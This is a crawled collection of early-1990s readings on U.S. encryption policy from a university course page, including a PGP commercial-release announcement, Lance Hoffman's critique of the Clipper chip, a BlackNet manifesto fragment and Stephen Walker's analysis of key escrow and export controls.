substantive rights for individuals intercepted through electronic surveillance, and noncompliance with these procedures shall not provide the basis for any motion to suppress or other objection to the introduction of electronic surve Colophon This summary was prepared by Dhaneesh Kumbhani, Nathan Gasser, and Meng Weng Wong as the term paper for CIS590.

Subject: Coming Soon: Commercial version of PGP!Date: Wed, 25 Aug 93 2:53:08 MDTFrom: Philip Zimmermann <uunet!columbine.cgd.ucar.EDU!prz> Coming Soon: Commercial Version of PGP! Philip Zimmermann has signed an agreement with ViaCrypt, a divisionof Lemcom Systems, Inc, to sell a commercial version of PGP. ViaCryptis a company in Phoenix Arizona that already has an RSA license fromPublic Key Partners to sell products that use the RSA algorithm. The freeware version of PGP will still be available, and will bemaintained as well as the commercial version. Most corporationswere not willing to use PGP because it was not licensed by PKPor RSA Data Security. With this commercial version of PGP, it will bepossible for PGP to enter commercial environments for the first time,and compete with other products such as PEM. This is expected toenhance PGP's viability as a de facto standard in the long run. ViaCrypt PGP will be available in the USA and Canada, for an introductoryprice of $100 for a single user, with quantity discounts available.For details, call ViaCrypt at (602) 944-0773, or contact PhilipZimmermannat prz@acm.org.

Hoffman) Several people have asked me to post this forthose who do not get Communicationsof the Association for Computing Machinery.So here it is, reprinted withpermission from Communications of the ACM,September 1993, volume 36, number 9. (This is a version which differs in minordetail from the one which finallyappeared, and which does not have thefootnotes included in the CACM article.But, otherwise it is substantially the same.) Viewpoint: CLIPPING CLIPPER Professor Lance J. HoffmanDepartment of Electrical Engineering andComputer ScienceThe George Washington UniversityWashington, D. C.hoffman@seas.gwu.edu The FBI is becoming increasingly worriedabout the fact that the UnitedStates is technologically close to havingeffectively unbreakable encryptionavailable to individuals. This will eliminateits capability to listen in onspecific telephone conversations, even with acourt-authorized warrant underexisting wiretap legislation. In 1991, itpushed legislation to to requiresignificant changes in computer hardware,software, and communications equipmentso that agents could maintain thesecapabilities in the increasingly digitaltelephone network [1]. But opposition bycomputer and communications companies,professional societies, and civil libertariansconvinced the Senate to remove theprovision from its crime bill. Last year, notone member of Congress was willingto introduce legislation requiringtelecommunications providers to turn back theclock and redesign the emerging digitaltelecommunications system so that the FBIcould, at some considerable economic cost toall users, continue to tap, undercourt order, certain digital communications[2]. Now the FBI and its allies in theintelligence community have persuaded thePresident to pursue a course which, if notreversed, may achieve the same goal byeffectively building "Big Brother"capabilities into the computer/telephonenetwork of the future with the "Clipper" chip,an encryption device withapplications in telephones and other computernetwork peripherals [3, 4, 5]. The Clipper encryption method [6] (seesidebar) requires escrowing of userencryption keys with two trusted authorities,not announced as of this writing.One might anticipate the government willcompound its surprising move with Clipperby selecting two in-governmentexecutive-branch entities as the escrowagents.If it does so, there will be further erosionof the power of Congress to establishpublic policy. One could, of course, ask whether escrowtechnology will be accepted bycomputer users who can get the real thingelsewhere. Encryption is availablearound the world without the burden of keyescrowing -- preliminary survey resultsfrom the Software Publishers Associationrevealed 143 non-U.S. and 133 U. S.-basedcryptographic products, many providing DES [7]and/or RSA [8] capabilities.Moreover, encryption software (including DESand RSA algorithms and the user-readyand popular Pretty Good Privacy (PGP) [9]secure message system) is freelydownloadable from public networks around theworld [10]. Encryption is becoming increasinglyimportant. Persons who wish unescrowedconfidentiality -- both law-abiding personsand criminals -- will find and useother encryption schemes to protectinformation they wish to keep secure. Afterall, it is not hard to superencrypt messageswith one's own software or hardwareencryption first, not registering any key withany authority, and very possiblyusing an imported device (or software) fromanother country. Increasingly,travelers use telephones to communicateinformation back and forth betweenworkstations they have never seen before andtheir home or office computers; thethreats of eavesdropping and falsification aremuch greater than in years past[11]. These persons can't be expected totrust a U. S.-developed standard whosealgorithm is secret if they can instead turnto cryptosystems available elsewherewith an algorithm that has faced publicscrutiny and whose keys are completelyunder control of the user. The only way a government can preventthis is by outlawing the use ofencryption methods which are not readable bythe government. The Administrationadmits that this is a fundamental policyquestion which "will be considered duringthe broad policy review" [12] it has underway.If the government adopts (or, asit appears now, decrees) such a "DigitalVolstead Act", there will be somebenefits to law enforcement. In the long termhowever, it will have a negativeeffect on individual freedom and liberty. Itmight even encourage contempt forlaw enforcement on the digital network sincestrong cryptographic algorithms arealready available in software, freelyreproducible by all who desire, regardlessof where they live or work. The Clinton administration shouldpostpone the introduction of Clipper. AndCongress should mandate a serious, open,public review of the issues and optionsfacing society. The implications are tooprofound to allow the promulgation ofthe first partially classified FederalInformation Processing Standard (FIPS)without appropriate discussion. Congress should also move to strengthenthe independence of NIST, which hasapparently not only used the National SecurityAgency's skills in cryptography (asrequired by the Computer Security Act of 1987)but also appears to be all tooeager to adopt its policy interests as well.This has resulted in the discussionof critical issues being framed by thecryptographic policy specialists at NSA,who have so far sidestepped Congress and areprotecting their traditional ways ofdoing things, while the world is changing allaround them. They are apparentlyreluctant to admit that cryptography and thepolicy issues that go with it are nowimportant enough to merit a full publicdebate, or that the genie may be out ofthe bottle, or that we now have "a regulatorystructure that goes back to the coldwar and does not recognize the realities ofthe present situation" [11]. So theyare using the Clipper initiative to pull off a"turf coup d'etat". The issue here is U.S. cryptographicpolicy and who controls it, not thetechnical merit of the Clipper initiative.This has far-reaching policyimplications [13, 14] and is not an issue forthe technical community only. The Clinton administration has, to itscredit, identified the importantquestions and realizes that there are seriousconstitutional issues here.Unfortunately, it has picked the wrong player-- the National Security Council --to examine them in the wrong forum, aclassified one. There is no valid reasonfor the broad policy debate to be classifiedand many reasons for it not to be;one of the most important is the government'scredibility. There is no need torush to judgement here. The administration has not reached outbeyond the government to computerhardware or software manufacturers or to thetelecommunications industry or tobusiness in general or to academe during theplanning of the Clipper initiative.This is one reason that almost all the majorplayers in the industry have raisedserious objections [11, 10, 15]. No adequateand public analysis of the economicand social costs and benefits of the Clipperproposal has yet been done. Unfortunately, the administration isconducting a hasty ill-definedinvestigation, going hell-bent for leather toconclude by about the time you readthis [19]. Instead, what is needed is aserious, comprehensive, dispassionatestudy, with real data, cool heads, unbiasedscientists, legal experts, andadequate time for examining many intricateissues which threaten long lasting,even permanent, consequences for the basicstructure of constitutional governmentin the United States. A number of issues must be considered inthe encryption policy discussion: - Very serious Constitutionalquestions. In the opinion of some, thegovernment's key-escrow initiative wouldviolate the First, Fourth, and FifthAmendments of the U. S. Bill of Rights [15,20, 21], and possibly others such asthe Ninth and Tenth. - Serious questions regarding theproposed Clipper key escrow scheme,including non-government escrow agencies andsoftware solutions [22] - 114 questions asked by the DigitalPrivacy and Security Working Group[15]. As of this writing, NIST had notresponded to these. - How U. S. firms can compete withforeign firms who don't have to "dumbdown" [23] the technology (the "level playingfield" issue) - Tensions between law enforcement,national security, and the citizen'spersonal freedoms and rights, such as privacy. - The future world of a National (andInternational) InformationInfrastructure, and why export controls [10,24] have to be reformulated - A rough cost/benefit analysis ofany controls over cryptography,including retraining and conversion costs forcryptographic experts with much lessto do if an increasing amount of traffic willbe encrypted well enough to defyeffective decryption by them. Better answers will emerge if respectedorganizations such as the National Academyof Sciences and the Office of TechnologyAssessment are given the opportunity toanalyze the issues carefully. There are meritorious alternatives toClipper. For example, Professor SilvioMicali of MIT has proposed a multi-key escrowcapability in which multiple trustedparties authenticate a message and/or alloweavesdropping [25]. The parties canbe selected by the message sender or jointlyby the sender and the other party (aswith current escrow agents). Without a choiceof alternatives, many persons whoare eager to develop and use the emerginginformation infrastructure -- "digitalsuperhighways" and other forward-lookingprojects of Vice President Gore -- willturn away from those projects. The fullpotential of the network and the VicePresident's vision will never be realized. The Computer System Security and PrivacyAdvisory Board, created by theComputer Security Act of 1987, called for sucha full, public national review ofcryptographic policy in March 1992. It, too,is queasy with the Clipperinitiative. On June 4, 1993, it passed aresolution which stated that "Key escrowing encryption technologyrepresents a dramatic change in thenation's information infrastructure. The fullimplications ... are not fullyunderstood at this time. Therefore, the Board recommends that keyescrowing encryption technology notbe deployed beyond current implementationsplanned within the Executive Branch,until the significant public policy andtechnical issues ... are fullyunderstood". NIST has not (ever) taken any significantaction on the cryptographic policysuggestions of this national statutory boardwhose basic mission is to be alertfor latent public policy issues related tocomputer and communications technology. By the time you read this, the governmentpolicy "review" may be close tocompletion. Computer professionals have aspecial obligation to let theirsenators and member of Congress (as well asother key legislators) know of theprofound negative impacts of such a rush tojudgment, and to urge them to deferthis initiative. Copies of thosecommunications should also be sent to thePresident (whose electronic mail address ispresident@whitehouse.gov), the vicepresident (whose electronic mail address isvice.president@whitehouse.gov), andto NIST which is the official governmentspokesman on the issue through its deputydirector, Raymond G. Kammer,(kammer@micf.nist.gov). REFERENCES 1. Sessions, W.S., "Keeping an Ear on Crime",New York Times, March 27, 1992, pageA35. 2. Denning, D., To Tap or Not to Tap. CACM36:25-44, 1993. 3.

We buy and sell information using public key cryptosystems withessentially perfect security for our customers. Unless you tell us whoyou are (please don't!) or inadvertently reveal information whichprovides clues, we have no way of identifying you, nor you us. Our location in physical space is unimportant. Our location incyberspace is all that matters. Our primary address is the PGP keylocation: "BlackNet<nowhere@cyberspace.nil>" and we can be contacted(preferably through a chain of anonymous remailers) by encrypting amessage to our public key (contained below) and depositing thismessage in one of the several locations in cyberspace we monitor.Currently, we monitor the following locations: alt.extropians,alt.fan.david-sternlight, and the "Cypherpunks" mailing list. BlackNet is nominally nondideological, but considers nation-states,export laws, patent laws, national security considerations and thelike to be relics of the pre-cyberspace era. Export and patent lawsare often used to explicity project national power and imperialist,colonialist state fascism. BlackNet believes it is solely theresponsibility of a secret holder to keep that secret--not theresponsibilty of the State, or of us, or of anyone else who may comeinto possession of that secret. If a secret's worth having, it's worthprotecting. BlackNet is currently building its information inventory.

But Key Escrow Won't Help Stephen T. Walker1 Trusted Information Systems, Inc. August 31, 1993 1. Summary On April 16, 1993, the President announced "a voluntary programto improve the security and privacy of telephone communicationswhile meeting the legitimate needs of law enforcement."2 Thisannouncement contains the very strong statement that: "The Administration is committed to policies that protect all Americans' right to privacy [emphasis added] while also protecting them from those who break the law." The announcement describes a new encryption algorithm that is"more powerful" than many in commercial use today whilepreserving "the ability of federal, state, and local lawenforcement agencies to lawfully intercept the phoneconversations of criminals" through the use of a "key-escrow"system. This paper summarizes my review of the information presented tothe Computer System Security and Privacy Advisory Board (CSSPAB)in public testimony and related publicly available informationconcerning the President's "Clipper Chip" Initiative. Based on this review I have concluded that:  Key escrow technology will NOT protect Americans "from those who break the law."  For Administration policies to "protect all Americans' right to privacy," the Administration will have to acknowledge the worldwide availability of good quality cryptography and stop denying Americans the use of technologies that are freely available to others in the name of protecting us "from those who break the law." The real issue confronting us in the President's Clipper ChipInitiative is obtaining an appropriate balance between:  legitimate law enforcement and national security concerns with intercepting communications that are not in the best interests of the U.S., and  legitimate concerns with protecting U.S. Government and commercial sector sensitive information and preserving the U.S. economic position. For too long, the law enforcement and national security interestshave controlled the dialog in this debate through their specialpositioning in the Executive Branch of the Government. Now withadvances in technology and worldwide availability of cryptographythreatening to impede the ability to easily listen to others,these agencies are proposing potentially highly invasive measuresthat have little prospect of improving law enforcement andnational security intercept capabilities, while having asignificant negative impact on U.S. commercial capabilities andinterests. Meanwhile, requirements to protect U.S. Government and commercialsensitive information and maintain U.S. strength in the computerindustry remain restricted without a voice in the debate. While there may be a strong desire to slow the erosion in ourtechnical communications intercept capabilities, this paper willshow that the new key escrow approach will have little positiveimpact because it will see little use beyond the government. However, if the Administration were to acknowledge today'sworldwide availability of good quality encryption capabilities,such as the Data Encryption Standard (DES), our Government andcommercial interests in protecting U.S. sensitive data would bevastly improved. In so doing, our ability to intercept otherscould be marginally hurt, but many feel the gains outweigh thelosses. We must have a balanced review representing both sides of thisnational dilemma. Such a debate cannot occur exclusively withinthe Executive Branch of the Government because of its closeaffiliation with the law enforcement and national securitycommunities and the absence of any effective representation forU.S. commercial interests. The Congress is the only organization that represents allconstituencies affected by such a debate. In the interest ofreaching a fair and timely resolution of this national issue, Istrongly encourage the Congress to act swiftly to establish anational policy regarding the use of cryptography to resolve thisdilemma and clarify all Americans' right to privacy. 2. Background In the fall of 1992, AT&T announced a telephone security devicethat would provide high quality security using the DES algorithmto protect the public's sensitive phone calls.3 Orders weretaken for delivery in early 1993. When the devices arrived,purchasers were told they were only "on loan" and would bereplaced by a "better" device in "April 1993." According to Dr. Clinton Brooks of NSA, AT&T came to NSA askingif they should use DES in these devices.4 NSA realized that ifit did not want DES to become widely used in such devices, itwould have to accelerate the availability of technology italready had under development (now known as Clipper) that wouldgive higher security than DES but with key escrow5 capabilitiesto protect the interests of the law enforcement community.Apparently, AT&T decided to go along with NSA so long as theClipper technology was made available on a timely basis. On thesame day in April that the President proclaimed the ClipperInitiative, "AT&T announced it would use the new chip in all itssecure non-government telephones."6 But the chips that implement Clipper have been delayed throughmanufacturing difficulties. So in early August AT&T announcedimmediate availability of two new non-Clipper, non-key escrowtelephone security devices, using AT&T proprietary algorithms,one approved for export, the other not. At the same time,Cylink, a manufacturer of security equipment, announced a DES-based phone security device. It would seem that in a little less than a year, we have comefull circle. Once again there are telephone security devices(DES and non-DES) on the market, this time in open competitionwith the Government's proposed key escrow system that wasintended to replace an earlier DES-based offering. 3. What are the Real Issues with Key Escrow What impact will these new products have on the Government'svoluntary program to have key escrow systems become widely used?Will the law abiding public prefer to buy secure phones with orwithout key escrow, or just not buy them at all? And where isall of this headed in the computer communications world? Do weneed/want key escrow capabilities for our communications? Can weafford the price we will have to pay for them? Before we cananswer these questions we need to examine a number of difficultissues from practical, economic, and philosophical perspectives. Law Enforcement's Wiretap Capabilities An analysis of the prospects for the law enforcement communitybeing able to maintain its present level of wiretap capability iscontained in Appendix A. Through examination of a series ofscenarios ranging from doing nothing to mandatory enforcement ofkey escrow cryptography for all phones in the U.S., it becomesclear that irreversible advances in digital telephony technologyand growing availability of encryption will make it increasinglydifficult to wiretap the communications of sophisticated criminalelements, with or without key escrow capabilities. Conclusion: With respect to the feasibility of law enforcement's being able to continue present day telephone wiretaps of illegal activities:  Over the next few years, the law enforcement community will probably lose the technical ability to wiretap sophisticated criminal activities, regardless of whether we install key escrow systems or not, and conversely,  the law enforcement community will almost certainly retain the technical ability to wiretap law abiding citizens and unsophisticated criminals, regardless of whether we install key escrow systems or not. Key Escrow Applied to Telephones and Computer Communications The limited available information concerning how key escrowtechniques will work for telephone and computer communicationssystems is analyzed in Appendix B. Key escrow techniques appearrelatively straight forward in simple point-to-point telephonesituations, but their application to sophisticated computercommunications environments is much more complex. Whiletechnically feasible, these applications will be subject to awide variety of software bypasses of the hardware-only key escrowprovisions that will defeat their effectiveness. They will alsoimpose a unique hardware expense on the user which will beunacceptable in most situations. Conclusion: With respect to the use of key escrow for telephone communications:  The emergence of the non-key escrow telephone security devices (such as the new AT&T and Cylink devices) will confuse the market place and deprive the Government of its hoped for widespread voluntary use of key escrow. With respect to the use of key escrow for computer networkcommunications:  Significant technical and legal complications confront the use of key escrow in computer applications. The Government's hardware-only restrictions for key escrow systems cannot be achieved in computer systems where software controls the basic applications for file transfer, electronic mail, and electronic commerce. No specific requirement for law enforcement wiretap of computer communications has been identified. Conventional search warrant procedures may be adequate for obtaining computer data rather than key escrowed wiretaps. International Acceptance of Key Escrow The issues of international acceptance and use of key escrowtechniques seem to have been poorly thought out in the Clipperplan. The sharing of escrowed keys with other governments openstechnological, political, and psychological issues that arelikely to be insurmountable. One need only consider the feelingsof a U.S. citizen whose encryption keys were available to acollection of foreign interests to recognize that foreigninterests will feel the same way about U.S. Government keyescrow. While one can understand how individual governmentsmight see advantages in such sharing, it is difficult to see howindividual citizens anywhere will find the use of key escrowacceptable. In a world of growing multinational economies, keyescrow arrangements among individual governments seem sadly outof place. The Skipjack7 Algorithm and Key Escrow Control Procedures The Government's Skipjack review team found8 that the algorithmused in the Clipper chip is sound and not subject to easy defeatby exhaustive key search9 or shortcut attacks. I am fullyprepared to accept this team's findings both because of thequality of people who performed the analysis and the belief thatNSA would not introduce a flaw in an algorithm of this type. Butthe problem with Clipper, if there is one, will not be in thealgorithm itself but with the key escrow control procedures whichthe Government is developing to grant law enforcement access tothe Clipper keys. The key escrow control procedures, which are still not fullyworked out, are intended to provide law enforcement with rapidaccess to keys while protecting the public from improperdisclosure to unauthorized individuals. As described to theCSSPAB on July 29, 1993, the procedures appear to provide verylimited protection against a government official who might beoperating in an illegal manner. Constitutional Rights Issues Many people have discussed concerns about possible violations ofthe Constitutional rights of individual citizens by the use ofkey escrow procedures. I will defer such questions to otherswith a legal background. I do have one concern regarding the comment in the President'sApril 16 announcement that "the Administration is committed topolicies that protect all Americans' right to privacy while alsoprotecting them from those who break the law." These two goalsseem impossible to achieve at the same time. This seems to bemore a "right to privacy from everyone but the Government," whichis a long way from the Bill of Rights. Overall Conclusion: Key escrow technology will NEITHER advance the public's right to privacy NOR protect it "from those who break the law." As desirable as those goals may be to the Government, thetechnical, economic, and personal privacy aspects of key escrowtechniques will limit them from playing a significant role in ourfuture telephone and computer communications systems. As our communication technologies continue their rapid evolution,we must be careful not to hamstring them with restrictive"solutions" to issues that have been overtaken by technology. 4. But what about protecting "all Americans' right to privacy"? Even if key escrow can't assure the protection of Americans "fromthose who break the law," we can make progress on the other themeof the Clipper announcement, the protection of "all Americans'right to privacy"! There are several issues to be considered here:  Good cryptography (of the quality of DES) is already available worldwide and attempts to contain it in the U.S. are only hurting U.S. users and vendors.  Because of export restrictions, U.S. manufacturers are reluctant to integrate good cryptography into their products since they cannot sell them to the majority of their markets. This has multiple negative effects, such as: - denying U.S. users good quality integrated encryption products even for use only in the U.S., - denying U.S. computer vendors significant overseas sales which automatically go to foreign vendors, and thus, - exporting U.S. jobs in computer related industries to foreign countries. An ongoing study of foreign availability of cryptography10 has inonly a few weeks found several hundred products, most of themDES-based, that are available just about anywhere in the world.Many of these products, being sold in the U.S., are from foreignmanufacturers since many countries' export laws, while claimingto be similar to those of the U.S., make it quite easy to getexport licenses to the U.S. Several German DES products areroutinely sold here through a blanket export license. But oncehere, those products cannot leave the U.S. This situationeffectively guarantees that whatever worldwide business therewill be in products that use cryptography will go to thosecompanies in those countries that can readily export theirproducts. The U.S. is losing this very important and rapidlygrowing market. And it's not just the sale of products that use cryptography thatwe are losing. When U.S. companies cannot supply reasonablecryptography fully integrated into their entire product line,they are losing the sale of major information systems, of whichthe cryptographic products may be only a small portion. Mass market software is one of the few industries where the U.S.holds a significant technological and commercial advantage. YetU.S. producers are reluctant to incorporate cryptography intotheir products, solely because of U.S. export uncertainty. TheSoftware Publishers Association, in a major shift in U.S. exportpolicy in 1992, obtained blanket export permission for encryptionproducts using keys limited to 40-bit key lengths. However, theworld market, which already has ready access to 56-bit key DESproducts, recognizes the weakness of 40-bit keys and simply willnot accept them. Government officials11 complain that industry cannot provide aneconomic analysis of how much business is being lost through theimposition of export controls on cryptography. They have a rightto complain, but they must understand that this is a rapidlyemerging economic environment. Once we can document in detailwhat we are losing or have lost, the situation will be so faralong that we will be out of the game and unable to recover. Wemust look at the indicators and adjust our strategy based on themor we will lose much more than the sale of a few cryptographicdevices. DES is not in the public domain? The U.S. Department of State has declared that information aboutcryptography that is not in the public domain cannot be exported.When faced with the question, "Isn't DES in the public domain?"they insist that it is not. To do otherwise, of course, would beto admit that DES could be readily exported, which they aredetermined not to allow. If exportability of good qualityencryption products were not a critical issue for the U.S.computer industry, this U.S. Government policy would be just onemore case where policy ignores reality. Unfortunately, it's much WT02-B11-278IA086-000618-B041-330http://res2.resnet.upenn.edu:80/cis590/reading.006.html 130.91.195.242 19970122052214 text/html 17974HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 05:22:16 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 17802Last-modified: Tue, 22 Nov 1994 06:30:48 GMTThe Clipper Initiative part 2 of 3 more important than that! All of the information needed to implement DES has been widelypublished as a U.S. Government Standard12 for 17 years. In 1986,the International Standards Organization (ISO) approved DES as aninternational standard, DEA-1. Later, the ISO decided it shouldnot standardize on any cryptographic algorithm, and DEA-1 was notpublished as an ISO standard. Even so, DES is probably the mostwidely known and accepted encryption algorithm in theinternational community. Books and articles are routinelypublished telling how to implement DES in software and indeedgiving the code to do it. Products that use DES in software andhardware are routinely available worldwide. How long must ourGovernment harm the American people with policies that have nobasis in reality? Conclusion: With respect to the impact of export controls on U.S. commercial interests, the present Government policies on export of cryptography are:  Depriving U.S. businesses of the ability to protect their sensitive information in a routine and economic manner,  Depriving U.S. computer businesses of a rapidly growing worldwide market in information products that contain a reasonable degree of security protection,  Encouraging the development of such products outside the U.S., and  Exporting U.S. jobs to overseas manufacturers. Why does the Government insist on export controls? Presumably, the reason for the Government's strangle hold onexport of cryptography is to prevent its widespread use againstlaw enforcement and other legitimate government interests. But the issue is not simply law enforcement's desire to continueto wiretap criminals' phones. The not-so-invisible force behindall of this is the national security interest to intercepttraffic from foreign sources for intelligence purposes. Somehowthis is the deep dark secret that everyone knows but no one issupposed to mention. The conflict of interest referred to in the President's Clipperannouncement is not just law enforcement desires versus thepublic's need for good cryptography but these much more importantnational security interests versus the public's need to protectits sensitive information. Conclusion: With respect to law enforcement and national security interests in intercepting communications in general: Good quality encryption technology to protect communications from eavesdropping is becoming widely available throughout the world. This inevitable shift in technology will make it increasingly difficult for law enforcement and national security interests to intercept communications, irrespective of any technical or legal measures the U.S. Government might take to prevent it, including government export controls on encryption technology or government imposed key escrow systems. Why is key escrow technology being proposed? A recent Administration publication of Questions and Answers onthe Initiative13 contained the following, within the answer tothis question: "With growing availability of lower cost, commercial encryption technology for use by U.S. industry and private citizens, it became clear that a strategy was needed that could accommodate the needs  of the private sector for top notch communications security;  of U.S. industry to remain competitive in the world's secure communications market; and  of U.S. law enforcement to conduct lawfully authorized electronic surveillance." >From the above analysis it should be clear that:  while Skipjack represents very strong cryptography, with key escrow added, few will view it as "top notch communications security,"  just as with the 40-bit key "solution," key escrow will not allow "U.S. industry to remain competitive" in any international market, and  law enforcement will find it increasingly difficult to conduct wiretaps, with or without key escrow capabilities. In short, none of these stated goals is achievable. The same "answer" then went on to say: "Enhancing the Government's ability to decrypt non-key escrow encryption used by the targets of authorized law enforcement wiretaps is another possible strategy for coping with the effects of encryption on law enforcement. However, since encryption appears in a number of forms and applications, the costs are likely to be substantial and may not be either affordable or practical given the requirement for 'real time' decryption in the course of wiretap operations." Enhancing the ability to decrypt non-key escrow encryption maywell be the only practical measure that the law enforcement andnational security communities can take. As a minimum, the costsof these alternatives should be well understood before we launchinto a massive key escrow process that has been demonstrated tohave little likelihood of achieving its goals. 5. A National Dilemma! This situation is truly a dilemma of national importance that cannot be resolved with a "one way or the other" decision but mustinvolve a compromise of the interests of both sides. Key escrowwas a good try at a solution, but as the above analysisindicates, it will not be acceptable against the harsh realitiesof economics and human nature. Some form of "cryptography whichis good enough for the public's use even if it may make thenational security task harder" compromise must be reached. For over fifty years, the national security side of this storyhas always had the interest of every U.S. Administration and forgood reason. "Codebreaking is the most important form of secretintelligence in the world today. It produces much more and muchmore trustworthy information than spies, and this intelligenceexerts great influence upon the policies of governments."14Breaking the codes of others has been and continues to be a vitalaspect of our national security. But we are now in an international world of interconnectedcommunications systems carrying all kinds of sensitiveinformation vital to our economic and national well being.Technology has advanced to the point where cryptography is bothhighly feasible and desirable for use by private citizens andbusiness. It is dangerous to deny ourselves the ability toprotect our own sensitive information in the hope that we maystill be able to eavesdrop on others. We must face the fact that foreign interests already have goodcryptography which they will increasingly use to protect theircommunications no matter how the U.S. Government tries to impedethem. If they do not employ good cryptographic mechanisms andpractices, it is for reasons other than their unavailability. It is essential that we hear from the other side, the interestsand needs of the public to protect its information, so that wecan weigh the two issues and reach a carefully consideredresolution to this dilemma for today and the future. As cryptography becomes more widespread, the ability to routinelyintercept and read such traffic will inevitably get harder. Keyescrow, if it were to become very widely used, could make boththe law enforcement and national security community's jobs mucheasier. But key escrow will not become widely used outside of government.The new non-key escrow phone devices will outsell all Clipperphones (except for the devices that the Government forces itselfto buy). Key escrow will never find a significant market in thecomputer communications world for the simple economic reason thatit will cost more then software encryption. No one who is notforced to use key escrow will choose to pay extra for it. And, as discussed in the Appendices, attempts to mandate the useof key escrow or to outlaw other forms of encryption will notsucceed even if given the force of law. The Final Conclusion Key escrow is not the panacea that its inventors envisioned. Itwill not drive out DES and other good cryptographic systems. Ina very real sense, the President's Clipper Chip Initiative hassounded the alarm for those who once viewed cryptography assolely of interest to the technicians. It may well havegalvanized opposition to unreasonable and restrictive governmentexport control policies in this area once and for all. Just as the law enforcement community has to face the fact thatno matter what we do, wiretaps are going to be less useful in thefuture because of advances in technology, so the intelligencecommunity has to face the fact that it will become progressivelyharder to listen in to others. Over the years, the Government'spolicy of denying export of cryptographic devices has perhapsslowed this inevitable trend a little. But, increasingly, thenegative effects of these policies on U.S. business, both onusers and suppliers of these technologies, far outweigh anypositive effect that further restrictions can have. Others have and will use good quality cryptography whether weallow ourselves to do so or not. We must not penalize ourselvesby further restricting cryptography, either through poorlyfounded export policies or poorly thought out technologies suchas key escrow. 6. So where do we go from here? The Administration is currently conducting an "InteragencyReview" as called for in the President's April announcement.Input from the public is being received from the testimony atmeetings such as from the CSSPAB and from groups such as theDigital Privacy and Security Working Group as well as industryand the public at large. This Interagency Review is not,however, a public debate of the issues confronting us. Theinterests of the commercial sector and of the public at large arenot well represented here. Recent proposed Congressional legislation15 has called for theestablishment of a "Comprehensive Independent Study of NationalCryptography Policy" by the National Research Council. Such astudy is welcomed as a means for exploring all sides of this mostimportant issue even if it does put off resolution of the issuefor up to two years. In any case, it is essential that the Congress become involved inthe timely resolution of this issue in a way that properlybalances the law enforcement and national security interests withthose of the public to protect its sensitive information.

The term "escrow" has specific legal meaning, and its use here implies a legal formalism beyond what appears to be provided. The draft Escrow Encryption Standard cites a definition of escrow as having delivered something "to a third person to be given to the grantee only upon fulfillment of a condition." As pointed out by Janlori Goldman, both the "escrow agents," who will hold the keys, and the law enforcement community are part of the Executive Branch of the Federal Government and can hardly be considered truly third parties in the legal sense. Rather than "key escrow," many refer to this simply as "the Government has your keys." 6 The Washington Post, April 17, 1993, page 1. 7 Skipjack is the name for the encryption algorithm used in the Clipper Chip. 8 "SKIPJACK Review Interim Report: The SKIPJACK Algorithm," July 28, 1993, by Ernest Brickell, Dorothy Denning, Stephen Kent, David Maher, and Walter Tuchman. 9 The Skipjack team cites several exhaustive key search attacks on the Skipjack 80-bit key space that are useful when compared with the present U.S. Government approved-for- export 40-bit key size. They postulate a $50M machine consisting of 100,000 processors that takes 4 million years to exhaust an 80-bit key space. Such a machine could check a 40-bit key space in 8.15 hours. They also speculate on a $1.2B machine with a 1GHz clock speed that takes 1 year to search an 80-bit key space. A machine 10,000 times slower or with 1/10,000 the processors could check a 40-bit key space in just over 1 second. An 80-bit key space is very strong and a 40-bit key space is extremely weak! 10 Sponsored by the Software Publishers Association, prompted in part by U.S. Government officials' insistence that they were unaware of the availability of foreign cryptographic products. 11 Dr. Ray Kammer, Deputy Director of NIST on July 30, 1993, at the CSSPAB hearing. 12 Federal Information Processing Standard (FIPS) Publication Number 46. 13 "Key Escrow Encryption Technology," from John D.

Comprehensive Independent Study of National Cryptography Policy. This bill is scheduled for further action on Sept. 8. APPENDIX A What can law enforcement expect from wiretaps in the future? The FBI and other law enforcement experts have made strong andsometimes impassioned pleas that we not let technology advancesdeny them the opportunity to tap into phone conversations ofillegal activities. Acknowledging the relatively small number ofwiretaps per year and the difficult process that the court systemrequires for obtaining a wiretap, they argue persuasively thatthe value of wiretaps in organized/white collar crime isinvaluable and must not be lost. The possibility of encountering scrambled communications thatcannot be decrypted is the concern being addressed by theGovernment's Clipper initiative. However, there are many otherconcerns inherent in the digital telephony issue that wereacknowledged by the FBI during the Board's hearings to be ofgreater concern than encryption.1 One of the very serious aspects of this problem involvesextending wiretaps beyond the "reach" of the telephone centraloffice. A wiretap on a home phone can be effected entirely atthe telephone company central office. A wiretap on a businessphone connected by a private branch exchange (PBX) cannot bedirectly tapped by the phone company. In earlier proposedlegislation, the FBI sought technical solutions to the digitaltelephony problems that would ensure they would not lose theirability to wiretap illegal communications. Few would argue that the public wants the law enforcementcommunity to provide effective protection against all forms ofcriminal activity. This situation argues strongly for keepingwiretaps as effective as possible for the benefit of the lawenforcement community and the public in general. But what is the future for wiretaps, anyway? Since key escrow procedures have been identified as theGovernment's fundamental means of ensuring the continuation ofeffective wiretaps, it is essential that we examine just howeffective wiretap capabilities will be in the future, whether weestablish key escrow procedures or not. Today (prior to the recent AT&T phone security announcement),only a few relatively expensive telephone encryption capabilitiesare available, and very few wiretaps encounter encryptedcommunications.2 Today, the general public and apparently mostcriminals use thepublic phone system to communicate without additional protectionand are thus subject to conventional wiretaps. One way to understand how things may turn out in the future is topostulate a series of scenarios and examine the differentoutcomes. If we do nothing: There are techniques available today for encrypting phones;however, because this whole topic of wiretaps and encryption hasuntil now been of obscure interest only to technicians, thecriminal element probably has not bothered to use them. Now thathigh- level attention is being called to this issue, one caneasily conjecture that sophisticated criminals (those whounderstand the threats to their activities and the availabilityand cost of countermeasures) are actively looking for ways toprotect themselves from wiretaps. In this scenario, theGovernment will retain the ability to tap the communications ofordinary citizens and average criminals but lose access to thecommunications of the sophisticated criminal. If non-key escrow devices become widely available: WT02-B11-279IA086-000618-B041-375http://res2.resnet.upenn.edu:80/cis590/reading.007.html 130.91.195.242 19970122052236 text/html 18007HTTP/1.0 200 OKDate: Wed, 22 Jan 1997 05:22:36 GMTServer: Apache/1.1.1Content-type: text/htmlContent-length: 17835Last-modified: Tue, 22 Nov 1994 06:30:50 GMTThe Clipper Initiative part 3 of 3 In the absence of any other actions by the Government, if non-keyescrow telephone encryption devices (such as the new AT&Tdevices) become widely available, then the sophisticated criminalwill use these devices to protect his or her communications fromwiretaps. That is the stated reason3 that NSA reacted sostrongly against the original AT&T DES phone security device.Other criminal elements (the average ones) will probably keepusing the phone system without protection. Thus the Governmentwill again retain the ability to tap the phones of ordinarycitizens and average criminals but lose 